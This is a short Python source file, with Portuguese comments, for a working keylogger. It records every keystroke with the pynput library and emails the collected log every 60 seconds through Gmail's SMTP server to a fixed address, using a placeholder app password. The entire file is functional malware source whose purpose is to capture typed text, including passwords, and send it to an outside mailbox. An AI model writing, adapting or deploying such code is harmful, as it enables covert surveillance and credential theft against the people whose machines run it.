from email.mime.text import MIMEText
import smtplib
from threading import Timer
from pynput import keyboard

# Configurações do e-mail
EMAIL_ORIGEM = "viana26cybersecurity@gmail.com"
EMAIL_DESTINO = "viana26cybersecurity@gmail.com"
SENHA_EMAIL = "SUA_SENHA_DE_APP_AQUI"

log = ""


def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg["Subject"] = "Dados coletados pelo Keylogger"
        msg["From"] = EMAIL_ORIGEM
        msg["To"] = EMAIL_DESTINO
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar:", e)
        log = ""

    # Agendar o próximo envio em 60 segundos
    Timer(60, enviar_email).start()


def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        else:
            pass  # Ignorar control, shift, etc.


# Inicia o keylogger e o envio automático de e-mails
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()